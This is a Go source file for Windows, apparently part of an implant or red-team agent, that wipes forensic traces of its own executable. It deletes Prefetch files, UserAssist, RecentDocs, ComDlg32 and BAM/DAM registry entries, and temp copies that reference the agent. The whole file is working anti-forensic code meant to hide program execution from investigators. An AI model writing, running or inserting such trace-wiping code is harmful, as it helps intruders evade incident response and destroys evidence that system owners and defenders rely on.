//go:build windows

package antiforensic

import (
	"errors"
	"io/fs"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// Registry locations, limited to the artifacts named in the package
// documentation. Nothing below these keys is enumerated.
const (
	userAssistKey  = `Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist`
	recentDocsKey  = `Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`
	comDlg32Key    = `Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32`
	openSaveKey    = `Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU`
	lastVisitedKey = `Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU`
	bamStateKey    = `SYSTEM\CurrentControlSet\Services\bam\State\UserSettings`
	damStateKey    = `SYSTEM\CurrentControlSet\Services\dam\State\UserSettings`
)

type scrubber struct {
	cfg       Config
	base      string
	baseLower string
	self      string
	report    Report
}

func scrub(cfg Config) Report {
	if !cfg.Enabled {
		return Report{}
	}
	s := &scrubber{
		cfg:       cfg,
		base:      baseName(cfg.ExePath),
		baseLower: strings.ToLower(baseName(cfg.ExePath)),
	}
	if self, err := os.Executable(); err == nil {
		s.self = normalizedAbs(self)
	}
	// An empty or directory-shaped ExePath would make prefix/substring
	// matching dangerously broad (an empty prefix matches every temp file).
	if s.base == "" || strings.HasSuffix(cfg.ExePath, `\`) || strings.HasSuffix(cfg.ExePath, "/") {
		s.report.addSkipped("antiforensic: ExePath %q has no usable file name; nothing scrubbed", cfg.ExePath)
		return s.report
	}

	s.logf("antiforensic: scrub start for %q (base %q)", cfg.ExePath, s.base)
	s.scrubPrefetch()
	s.scrubUserAssist()
	s.scrubMRUKey(recentDocsKey, 1)
	s.scrubMRUKey(comDlg32Key, 1)
	s.scrubMRUKey(openSaveKey, 1)
	s.scrubMRUKey(lastVisitedKey, 0)
	s.scrubBAM("bam", bamStateKey)
	s.scrubBAM("dam", damStateKey)
	s.scrubTemp()
	s.logf("antiforensic: scrub done: %d removed, %d skipped, %d errors",
		len(s.report.Removed), len(s.report.Skipped), len(s.report.Errors))
	return s.report
}

func (s *scrubber) logf(format string, args ...any) {
	if s.cfg.Logger != nil {
		s.cfg.Logger.Printf(format, args...)
	}
}

// reportErr classifies a failed operation. Permission denials, missing keys,
// and locked/in-use artifacts are expected on a normal box and go to Skipped;
// anything else is an unexpected Error. Neither aborts the scrub.
func (s *scrubber) reportErr(what string, err error) {
	if err == nil {
		return
	}
	if benignTraceErr(err) {
		s.report.addSkipped("%s: %v", what, err)
		s.logf("antiforensic: skipped %s: %v", what, err)
		return
	}
	s.report.addError("%s: %v", what, err)
	s.logf("antiforensic: error %s: %v", what, err)
}

// benignTraceErr reports whether err is the expected consequence of missing
// admin rights, a missing artifact, or a locked/in-use file rather than a
// logic failure.
func benignTraceErr(err error) bool {
	if err == nil {
		return false
	}
	if errors.Is(err, fs.ErrNotExist) || errors.Is(err, fs.ErrPermission) {
		return true
	}
	return errors.Is(err, windows.ERROR_ACCESS_DENIED) ||
		errors.Is(err, windows.ERROR_SHARING_VIOLATION) ||
		errors.Is(err, windows.ERROR_LOCK_VIOLATION) ||
		errors.Is(err, windows.ERROR_PRIVILEGE_NOT_HELD)
}

func (s *scrubber) referencesString(v string) bool {
	return referencesExe(v, s.cfg.ExePath) || argMatches(v, s.cfg.Args)
}

func (s *scrubber) referencesBinary(b []byte) bool {
	return binaryReferencesExe(b, s.cfg.ExePath) || binaryArgMatches(b, s.cfg.Args)
}

// scrubPrefetch removes %SystemRoot%\Prefetch\<exeBase>-*.pf. Only the exact
// Prefetch directory is read; no subdirectories are touched. Deletion usually
// requires admin, so refusals are Skipped.
func (s *scrubber) scrubPrefetch() {
	root := os.Getenv("SystemRoot")
	if root == "" {
		root = os.Getenv("windir")
	}
	if root == "" {
		s.report.addSkipped("Prefetch: SystemRoot/windir is not set; skipped")
		return
	}
	dir := filepath.Join(root, "Prefetch")
	entries, err := os.ReadDir(dir)
	if err != nil {
		s.reportErr("Prefetch: read dir "+dir, err)
		return
	}
	prefix := s.baseLower + "-"
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		lower := strings.ToLower(name)
		if !strings.HasPrefix(lower, prefix) || !strings.HasSuffix(lower, ".pf") {
			continue
		}
		full := filepath.Join(dir, name)
		if err := os.Remove(full); err != nil {
			s.reportErr("Prefetch: remove "+full, err)
			continue
		}
		s.report.addRemoved("Prefetch: %s", full)
		s.logf("antiforensic: removed prefetch file %s", full)
	}
}

// scrubUserAssist removes HKCU UserAssist Count values whose ROT13-decoded
// name references the agent. Each matching value is counted individually in
// Report.Removed.
func (s *scrubber) scrubUserAssist() {
	root, err := registry.OpenKey(registry.CURRENT_USER, userAssistKey,
		registry.ENUMERATE_SUB_KEYS|registry.QUERY_VALUE)
	if err != nil {
		s.reportErr("UserAssist: open HKCU\\"+userAssistKey, err)
		return
	}
	defer root.Close()

	guids, err := root.ReadSubKeyNames(-1)
	if err != nil {
		s.reportErr("UserAssist: list subkeys HKCU\\"+userAssistKey, err)
		return
	}
	for _, guid := range guids {
		path := userAssistKey + `\` + guid + `\Count`
		k, err := registry.OpenKey(registry.CURRENT_USER, path, registry.QUERY_VALUE|registry.SET_VALUE)
		if err != nil {
			s.reportErr("UserAssist: open HKCU\\"+path, err)
			continue
		}
		s.scrubUserAssistCount(k, path, guid)
		k.Close()
	}
}

func (s *scrubber) scrubUserAssistCount(k registry.Key, path, guid string) {
	names, err := k.ReadValueNames(-1)
	if err != nil {
		s.reportErr("UserAssist: list values HKCU\\"+path, err)
		return
	}
	removed := 0
	for _, name := range names {
		decoded := rot13(name)
		if !s.referencesString(decoded) {
			continue
		}
		if err := k.DeleteValue(name); err != nil {
			s.reportErr("UserAssist: delete HKCU\\"+path+"\\"+name, err)
			continue
		}
		removed++
		s.report.addRemoved("UserAssist: HKCU\\%s\\%s (decoded %q)", path, name, decoded)
	}
	if removed > 0 {
		s.logf("antiforensic: UserAssist %s: removed %d value(s)", guid, removed)
	}
}

// scrubMRUKey scans an HKCU MRU key for values whose name or raw data
// references the agent. depth 0 scans only the key itself; depth 1 also scans
// its immediate subkeys (one level, e.g. RecentDocs\<ext>), never deeper.
func (s *scrubber) scrubMRUKey(path string, depth int) {
	k, err := registry.OpenKey(registry.CURRENT_USER, path,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		s.reportErr("MRU: open HKCU\\"+path, err)
		return
	}
	defer k.Close()

	s.scrubMRUValues(k, path)
	if depth <= 0 {
		return
	}
	subkeys, err := k.ReadSubKeyNames(-1)
	if err != nil {
		s.reportErr("MRU: list subkeys HKCU\\"+path, err)
		return
	}
	for _, sub := range subkeys {
		subPath := path + `\` + sub
		sk, err := registry.OpenKey(registry.CURRENT_USER, subPath, registry.QUERY_VALUE|registry.SET_VALUE)
		if err != nil {
			s.reportErr("MRU: open HKCU\\"+subPath, err)
			continue
		}
		s.scrubMRUValues(sk, subPath)
		sk.Close()
	}
}

func (s *scrubber) scrubMRUValues(k registry.Key, path string) {
	names, err := k.ReadValueNames(-1)
	if err != nil {
		s.reportErr("MRU: list values HKCU\\"+path, err)
		return
	}
	for _, name := range names {
		// MRUListEx is the index order blob; it holds no path data and deleting
		// it would corrupt the MRU bookkeeping rather than remove a trace.
		if strings.EqualFold(name, "MRUListEx") {
			continue
		}
		if !s.valueMatches(k, path, name, true) {
			continue
		}
		if err := k.DeleteValue(name); err != nil {
			s.reportErr("MRU: delete HKCU\\"+path+"\\"+name, err)
			continue
		}
		s.report.addRemoved("MRU: HKCU\\%s\\%s", path, name)
		s.logf("antiforensic: removed MRU value HKCU\\%s\\%s", path, name)
	}
}

// valueMatches checks the value name, and optionally the raw value bytes, for a
// reference to the agent or one of its distinctive arguments. Data matching is
// needed because RecentDocs/ComDlg32 values store file names inside binary
// shell-item (PIDL) blobs rather than as REG_SZ strings.
func (s *scrubber) valueMatches(k registry.Key, path, name string, checkData bool) bool {
	if s.referencesString(name) {
		return true
	}
	if !checkData {
		return false
	}
	raw, err := readRegistryValue(k, name)
	if err != nil {
		s.reportErr("registry: read value HKCU\\"+path+"\\"+name, err)
		return false
	}
	return s.referencesBinary(raw)
}

// readRegistryValue returns the raw bytes of a registry value, retrying once if
// the value grows between the size query and the read.
func readRegistryValue(k registry.Key, name string) ([]byte, error) {
	n, _, err := k.GetValue(name, nil)
	if err != nil {
		return nil, err
	}
	if n <= 0 {
		return nil, nil
	}
	buf := make([]byte, n)
	for i := 0; i < 2; i++ {
		got, _, err := k.GetValue(name, buf)
		if err == nil {
			if got > len(buf) {
				got = len(buf)
			}
			return buf[:got], nil
		}
		if errors.Is(err, windows.ERROR_MORE_DATA) && got > len(buf) {
			buf = make([]byte, got)
			continue
		}
		return nil, err
	}
	return nil, errors.New("registry value changed while being read")
}

// scrubBAM removes HKLM BAM/DAM UserSettings values whose name references the
// agent. The State key is ACL-protected and normally writable only by SYSTEM
// or an elevated administrator, so refusals are Skipped.
func (s *scrubber) scrubBAM(label, rootPath string) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, rootPath, registry.ENUMERATE_SUB_KEYS)
	if err != nil {
		s.reportErr(label+": open HKLM\\"+rootPath, err)
		return
	}
	defer k.Close()

	sids, err := k.ReadSubKeyNames(-1)
	if err != nil {
		s.reportErr(label+": list SIDs HKLM\\"+rootPath, err)
		return
	}
	for _, sid := range sids {
		s.scrubBAMUser(label, rootPath+`\`+sid)
	}
}

func (s *scrubber) scrubBAMUser(label, path string) {
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, path, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		s.reportErr(label+": open HKLM\\"+path, err)
		return
	}
	defer k.Close()

	names, err := k.ReadValueNames(-1)
	if err != nil {
		s.reportErr(label+": list values HKLM\\"+path, err)
		return
	}
	for _, name := range names {
		if !s.referencesString(name) {
			continue
		}
		if err := k.DeleteValue(name); err != nil {
			s.reportErr(label+": delete HKLM\\"+path+"\\"+name, err)
			continue
		}
		s.report.addRemoved("%s: HKLM\\%s\\%s", label, path, name)
		s.logf("antiforensic: removed %s entry HKLM\\%s\\%s", label, path, name)
	}
}

// scrubTemp removes %TEMP% files whose name starts with the exe basename. It
// reads only that single directory, skips subdirectories, and never removes the
// running executable itself (compared by absolute path).
func (s *scrubber) scrubTemp() {
	dir := os.TempDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		s.reportErr("Temp: read dir "+dir, err)
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		if !strings.HasPrefix(strings.ToLower(name), s.baseLower) {
			continue
		}
		full := filepath.Join(dir, name)
		if samePathFold(full, s.cfg.ExePath) || (s.self != "" && normalizedAbs(full) == s.self) {
			s.report.addSkipped("Temp: %s is the running executable; kept", full)
			continue
		}
		if err := os.Remove(full); err != nil {
			s.reportErr("Temp: remove "+full, err)
			continue
		}
		s.report.addRemoved("Temp: %s", full)
		s.logf("antiforensic: removed temp copy %s", full)
	}
}
